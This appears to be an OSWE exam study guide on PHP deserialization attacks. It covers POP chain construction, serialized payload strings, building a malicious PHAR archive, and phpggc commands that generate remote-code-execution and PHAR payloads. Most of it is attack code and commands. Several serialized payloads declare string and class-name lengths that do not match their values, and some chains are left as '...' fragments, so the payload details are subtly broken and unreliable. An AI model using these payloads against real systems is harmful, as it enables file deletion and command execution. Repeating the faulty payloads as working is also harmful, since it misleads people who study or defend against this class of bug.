# PHP Deserialization Patterns Guide

## Overview
PHP object injection exploits magic methods that execute automatically during object lifecycle. Attackers chain object properties to achieve code execution (POP chains).

## Part 1: PHP Magic Methods

### Dangerous Magic Methods
```php
__wakeup()    // Called when unserialize() is invoked
__destruct()  // Called when object is destroyed
__toString()  // Called when object treated as string
__call()      // Called when invoking inaccessible method
__get()       // Called when accessing inaccessible property
__set()       // Called when writing to inaccessible property
```

### Exploitation Example
```php
class Evil {
    public $filename;

    function __destruct() {
        // VULNERABLE: File deletion on destruct
        unlink($this->filename);
    }
}

// Attacker payload:
$payload = 'O:4:"Evil":1:{s:8:"filename";s:16:"/var/www/index.php";}';
// When unserialized, __destruct deletes index.php
```

## Part 2: Building POP Chains

### Step-by-Step Methodology

**1. Identify Entry Point**
```bash
grep -r "unserialize(" /var/www/
# Common locations: cookies, POST data, file uploads
```

**2. Find Exploitable Classes**
```bash
# Search for dangerous magic methods
grep -r "__destruct\|__wakeup\|__toString" /var/www/
```

**3. Build Property Chain**
```php
// Example POP chain:
// Step 1: ClassA::__destruct() calls $this->logger->log()
// Step 2: ClassB::__call('log') calls $this->file->write()
// Step 3: ClassC::write() calls system($this->cmd)

$obj = new ClassA();
$obj->logger = new ClassB();
$obj->logger->file = new ClassC();
$obj->logger->file->cmd = "whoami";

$payload = serialize($obj);
```

## Part 3: Serialization Format

### PHP Serialization Syntax
```
O:      Object
a:      Array
s:      String
i:      Integer
b:      Boolean

Format: TYPE:SIZE:VALUE
```

**Examples**:
```php
// Simple object
O:4:"User":2:{s:4:"name";s:5:"admin";s:2:"id";i:1;}
// Decoded: Object "User" with name="admin", id=1

// Nested object
O:4:"Evil":1:{s:4:"file";O:10:"FileWriter":1:{s:4:"path";s:9:"/etc/passwd";}}
```

## Part 4: PHAR Deserialization

### PHAR Wrapper Exploitation
PHAR archives contain serialized metadata. Using `phar://` wrapper triggers unserialization.

**Creating Malicious PHAR**:
```php
<?php
class Evil {
    public $cmd = "whoami";
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());
$phar->stopBuffering();
?>
```

**Triggering Exploitation**:
```php
// Any file operation with phar:// triggers unserialize
file_get_contents('phar://evil.phar/test.txt');
file_exists('phar://evil.phar');
include('phar://evil.phar');
```

## Part 5: Common POP Chains

### Symfony POP Chain
```php
// Uses Symfony's PropertyAccess component
O:47:"Symfony\\Component\\PropertyAccess\\PropertyAccessor":1:{...}
```

### Monolog POP Chain
```php
// Uses Monolog's BufferHandler
O:32:"Monolog\\Handler\\BufferHandler":...
```

### WordPress POP Chain
```php
// Uses WordPress core classes
O:21:"WP_Embedded_Content":...
```

## Part 6: OSWE Exam Tips

### Code Review Checklist
- [ ] Search for `unserialize(`
- [ ] Identify all classes with magic methods
- [ ] Map property relationships between classes
- [ ] Build POP chain on paper first
- [ ] Test locally before exam

### Quick Wins
1. **File Write**: Look for __destruct with file_put_contents
2. **Command Injection**: Look for system() in magic methods
3. **File Include**: Look for include/require in chains

### Time Management
- **Code Review**: 15 minutes to map classes
- **POP Chain Construction**: 10 minutes
- **Payload Generation**: 5 minutes
- **Testing**: 5 minutes
- **Total**: ~35 minutes

## Part 7: Payload Generation Tools

### Manual Generation
```php
<?php
class Evil { public $cmd = "whoami"; }
echo serialize(new Evil());
// Output: O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}
?>
```

### PHPGGC Tool
```bash
git clone https://github.com/ambionics/phpggc
cd phpggc

# List available chains
./phpggc -l

# Generate payload
./phpggc Monolog/RCE1 system whoami

# Generate phar
./phpggc -p phar -o evil.phar Monolog/RCE1 system whoami
```

## References
- OWASP: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- PHPGGC: https://github.com/ambionics/phpggc
- PHAR Deserialization: https://blog.checkpoint.com/2019/02/13/phar-deserialization-vulnerabilities-in-php/
